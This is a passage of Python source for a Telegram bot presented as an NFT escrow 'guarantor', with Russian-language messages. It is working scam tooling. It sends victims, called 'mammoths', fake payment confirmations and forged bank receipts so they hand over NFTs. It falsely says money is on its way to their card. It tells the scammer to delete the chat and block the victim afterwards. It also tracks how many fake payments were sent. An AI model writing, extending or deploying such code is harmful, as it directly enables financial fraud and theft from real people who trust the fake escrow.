                    f"💰 Сумма: {format_price(deal['price'])}\n"
                    f"💸 Деньги отправлены на вашу карту\n\n"
                    f"⏳ Операция завершена успешно"
                )
                send_message(deal['mammoth_id'], mammoth_msg)
            
            answer_callback_query(query_id, "✅ Сделка завершена!", show_alert=True)
        elif result == 'partial':
            scammer_msg = (
                f"✅ <b>ВЫ ПОДТВЕРДИЛИ ОТПРАВКУ ДЕНЕГ</b>\n\n"
                f"Сделка: <code>{deal_id}</code>\n\n"
                f"⏳ Ожидайте подтверждения от получателя"
            )
            send_message(user_id, scammer_msg)
            answer_callback_query(query_id, "✅ Вы подтвердили отправку денег. Ожидайте подтверждения получателя.", show_alert=True)
        else:
            answer_callback_query(query_id, "❌ Ошибка подтверждения", show_alert=True)
    
    def handle_mammoth_confirm(self, query_id, deal_id, user_id):
        """Подтверждение получателя (отправка NFT)"""
        deal = get_deal(deal_id)
        
        if not deal:
            answer_callback_query(query_id, "❌ Сделка не найдена", show_alert=True)
            return
        
        if user_id != deal['mammoth_id']:
            answer_callback_query(query_id, "❌ Вы не получатель этой сделки", show_alert=True)
            return
        
        if deal['status'] != 'waiting':
            answer_callback_query(query_id, f"❌ Сделка уже {deal['status']}", show_alert=True)
            return
        
        result = confirm_deal(deal_id, 'mammoth')
        
        if result == 'completed':
            # Сообщение получателю
            mammoth_msg = (
                f"🎉 <b>СДЕЛКА #{deal_id} ЗАВЕРШЕНА!</b>\n\n"
                f"✅ Вы подтвердили отправку NFT\n"
                f"✅ Гарант подтвердил отправку денег\n\n"
                f"💰 Сумма: {format_price(deal['price'])}\n"
                f"💸 Деньги отправлены на вашу карту ( Придут в течении 30 минут )\n\n"
                f"⏳ Операция завершена успешно"
            )
            send_message(user_id, mammoth_msg)
            
            # Сообщение гаранту
            scammer_msg = (
                f"🎉 <b>СДЕЛКА #{deal_id} ЗАВЕРШЕНА!</b>\n\n"
                f"✅ Получатель подтвердил отправку NFT\n"
                f"✅ Вы подтвердили отправку денег\n\n"
                f"💰 Сумма: {format_price(deal['price'])}\n"
                f"🎨 NFT получено: {deal['gift_link']}\n\n"
                f"⏳ Операция завершена успешно , не забудьте удалить чат и заблокировать мамонта по истичению 20 минут"
            )
            send_message(deal['scammer_id'], scammer_msg)
            
            answer_callback_query(query_id, "✅ Сделка завершена!", show_alert=True)
        elif result == 'partial':
            mammoth_msg = (
                f"✅ <b>ВЫ ПОДТВЕРДИЛИ ОТПРАВКУ NFT</b>\n\n"
                f"Сделка: <code>{deal_id}</code>\n\n"
                f"⏳ Ожидайте подтверждения от гаранта"
            )
            send_message(user_id, mammoth_msg)
            answer_callback_query(query_id, "✅ Вы подтвердили отправку NFT. Ожидайте подтверждения гаранта.", show_alert=True)
        else:
            answer_callback_query(query_id, "❌ Ошибка подтверждения", show_alert=True)
    
    def handle_fake_payment(self, query_id, deal_id, user_id):
        """Отправка фейк платежа мамонту"""
        deal = get_deal(deal_id)
        
        if not deal:
            answer_callback_query(query_id, "❌ Сделка не найдена", show_alert=True)
            return
        
        if user_id != deal['scammer_id']:
            answer_callback_query(query_id, "❌ Вы не гарант этой сделки", show_alert=True)
            return
        
        if not deal.get('mammoth_id'):
            answer_callback_query(query_id, "❌ Получатель еще не присоединился к сделке", show_alert=True)
            return
        
        if deal.get('fake_payment_sent', 0) == 1:
            answer_callback_query(query_id, "❌ Фейк платеж уже был отправлен", show_alert=True)
            return
        
        # Генерируем и отправляем фейковый чек
        fake_receipt = generate_fake_bank_receipt(deal)
        
        # Отправляем мамонту
        mammoth_chat_id = deal['mammoth_id']
        
        mammoth_message = (
            f"💸 <b>ПЛАТЕЖ ПОЛУЧЕН!</b>\n\n"
            f"✅ <b>Сделка #{deal_id} оплачена!</b>\n\n"
            f"💰 <b>Сумма:</b> {format_price(deal['price'])}\n"
            f"💳 <b>На вашу карту:</b> •••• {re.sub(r'\D', '', str(deal['mammoth_card']))[-4:]}\n\n"
            f"⏳ <b>До зачисления:</b> 15-30 минут\n\n"
            f"<i>Деньги успешно отправлены. Проверьте баланс через некоторое время.</i>"
        )
        
        send_message(mammoth_chat_id, mammoth_message)
        
        # Отправляем подробный чек
        send_message(mammoth_chat_id, fake_receipt)
        
        # Отмечаем как отправленный
        set_fake_payment_sent(deal_id)
        
        # Уведомляем гаранта
        scammer_message = (
            f"✅ <b>ФЕЙК ПЛАТЕЖ ОТПРАВЛЕН</b>\n\n"
            f"Получателю отправлено уведомление об оплате\n"
            f"Сделка: <code>{deal_id}</code>\n"
            f"Сумма: {format_price(deal['price'])}\n\n"
            f"💡 Теперь получатель думает, что деньги отправлены"
        )
        
        send_message(user_id, scammer_message)
        answer_callback_query(query_id, "✅ Фейк платеж успешно отправлен получателю", show_alert=False)
        
        print(f"✅ Фейк платеж отправлен мамонту {mammoth_chat_id} для сделки {deal_id}")
    
    def handle_offers(self, chat_id):
        """Обработка /offers - показывает реальные сделки"""
        try:
            conn = sqlite3.connect("deals.db", check_same_thread=False)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT id, price, gift_link, status, created_at, mammoth_id
                FROM deals 
                ORDER BY created_at DESC 
                LIMIT 10
            ''')
            
            deals = cursor.fetchall()
            conn.close()
            
            if not deals:
                message = "📭 Нет активных сделок\n\n💡 Создайте сделку с помощью /skamoffers"
                send_message(chat_id, message)
                return
            
            message = "📊 <b>ПОСЛЕДНИЕ СДЕЛКИ</b>\n\n"
            
            for i, deal in enumerate(deals, 1):
                deal_id, price, gift_link, status, created_at, mammoth_id = deal
                
                status_emoji = {
                    'active': '🟢',
                    'waiting': '🟡',
                    'completed': '✅',
                    'cancelled': '❌'
                }.get(status, '❓')
                
                has_mammoth = "👤" if mammoth_id else "⏳"
                
                message += (
                    f"{i}. <b>Сделка #{deal_id}</b> {status_emoji}\n"
                    f"   ├ Сумма: {format_price(price)}\n"
                    f"   ├ NFT: {gift_link[:30]}...\n"
                    f"   ├ Статус: {status}\n"
                    f"   └ Получатель: {has_mammoth}\n\n"
                )
            
            message += f"💡 Всего сделок: {len(deals)}"
            send_message(chat_id, message)
            
        except Exception as e:
            print(f"❌ Ошибка получения списка сделок: {e}")
            send_message(chat_id, "❌ Ошибка получения списка сделок")
    
    def handle_get_link(self, chat_id, user_id):
        """Обработка /link"""
        if not self.bot_username:
            send_message(chat_id, "❌ Не удалось получить username бота")
            return
        
        example_id = generate_deal_id()
        link = f"https://t.me/{self.bot_username}?start={example_id}"
        
        message = (
            f"🔗 <b>ССЫЛКА ДЛЯ ПОЛУЧАТЕЛЯ</b>\n\n"
            f"<code>{link}</code>\n\n"
            f"<b>Как использовать:</b>\n"
            f"1. Создайте сделку (/skamoffers)\n"
            f"2. Получите уникальную ссылку\n"
            f"3. Отправьте ссылку получателю\n\n"
            f"💡 Каждая сделка имеет уникальную ссылку"
        )
        send_message(chat_id, message)
    
    def handle_help(self, chat_id, user_id):
        """Обработка /help"""
        is_admin_user = is_admin(user_id)
        
        if is_admin_user:
            message = (
                "🆘 <b>ПОМОЩЬ ДЛЯ ГАРАНТА</b>\n\n"
                "<b>📋 КОМАНДЫ:</b>\n"
                "• /skamoffers - Создать сделку\n"
                "• /create - Быстрое создание\n"
                "• /offers - Активные сделки\n"
                "• /link - Получить ссылку\n"
                "• /status - Статус бота\n"
                "• /help - Эта справка\n\n"
                "<b>📝 ПРОЦЕСС:</b>\n"
                "1. Создайте сделку (вы отправляете деньги)\n"
                "2. Отправьте ссылку получателю\n"
                "3. Получатель отправляет NFT и подтверждает\n"
                "4. Вы отправляете деньги и подтверждаете\n\n"
                "<b>🆕 НОВЫЕ ФУНКЦИИ:</b>\n"
                "• 💸 Фейк платеж - отправляет мамонту уведомление об оплате\n\n"
                "<b>⚠️ ВНИМАНИЕ:</b>\n"
                "• Бот не хранит средства\n"
                "• Все подтверждения через кнопки\n"
                "• Проверяйте данные перед отправкой"
            )
        else:
            message = (
                "🆘 <b>ПОМОЩЬ ДЛЯ ПОЛУЧАТЕЛЯ</b>\n\n"
                "<b>📋 КАК РАБОТАТЬ:</b>\n"
                "1. Получите ссылку от гаранта\n"
                "2. Перейдите по ссылке\n"
                "3. Отправьте NFT гаранту\n"
                "4. Подтвердите отправку NFT\n"
                "5. Ожидайте подтверждения от гаранта\n\n"
                "<b>🛡️ ГАРАНТИИ:</b>\n"
                "• Анонимность\n"
                "• Защита транзакций\n"
                "• Автоматическое подтверждение\n\n"
                "<b>⚠️ ВНИМАНИЕ:</b>\n"
                "• Отправляйте NFT только по официальной ссылке\n"
                "• Проверяйте сумму и карту получателя\n"
                "• Не делитесь ссылкой с другими"
            )
        
        send_message(chat_id, message)
    
    def handle_status(self, chat_id):
        """Статус бота"""
        try:
            conn = sqlite3.connect("deals.db", check_same_thread=False)
            cursor = conn.cursor()
            
            cursor.execute('SELECT COUNT(*) FROM deals')
            total_deals = cursor.fetchone()[0]
            
            cursor.execute('SELECT COUNT(*) FROM deals WHERE status = "active"')
            active_deals = cursor.fetchone()[0]
            
            cursor.execute('SELECT COUNT(*) FROM deals WHERE status = "completed"')
            completed_deals = cursor.fetchone()[0]
            
            # Проверяем наличие колонки fake_payment_sent
            cursor.execute("PRAGMA table_info(deals)")
            columns = [column[1] for column in cursor.fetchall()]
            
            if 'fake_payment_sent' in columns:
                cursor.execute('SELECT COUNT(*) FROM deals WHERE fake_payment_sent = 1')
                fake_payments = cursor.fetchone()[0]
            else:
                fake_payments = 0
            
            conn.close()
            
            message = (
                f"📊 <b>СТАТУС БОТА</b>\n\n"
                f"🤖 Бот: @{self.bot_username}\n"
                f"🔄 Обновление ID: {self.last_update_id}\n"
                f"👥 Пользователей в памяти: {len(self.user_states)}\n\n"
                f"📈 <b>СТАТИСТИКА СДЕЛОК:</b>\n"
                f"├ Всего сделок: {total_deals}\n"
                f"├ Активных: {active_deals}\n"
                f"├ Завершенных: {completed_deals}\n"
                f"├ Фейк платежей: {fake_payments}\n"
                f"└ В процессе: {total_deals - active_deals - completed_deals}\n\n"
                f"⏰ Время работы: {datetime.now().strftime('%H:%M:%S')}"
            )
            
            send_message(chat_id, message)
        except Exception as e:
            print(f"❌ Ошибка получения статуса: {e}")
            send_message(chat_id, "❌ Ошибка получения статуса")
    
    def handle_unknown_command(self, chat_id, user_id):
        """Обработка неизвестной команды"""
        message = (
            "❓ <b>Неизвестная команда</b>\n\n"
            "Используйте /start для начала работы.\n"
            "Если вы ожидаете получение NFT, попросите у отправителя ссылку.\n\n"
            "Для гарантов доступны команды:\n"
            "/skamoffers - создать сделку\n"
            "/help - помощь"
        )
        send_message(chat_id, message)

# ==================== ЗАПУСК БОТА ====================
def main():
    """Основная функция"""
    print("=" * 60)
    print("🚀 ЗАПУСК NFT GARANT BOT")
    print("=" * 60)
    
    try:
        bot = NFTBot()
        bot.start_polling()
    except Exception as e:
        print(f"❌ Критическая ошибка: {e}")
        traceback.print_exc()
        print("🔄 Перезапуск через 10 секунд...")
        time.sleep(10)
        main()  # Рекурсивный перезапуск

if __name__ == "__main__":
    main()
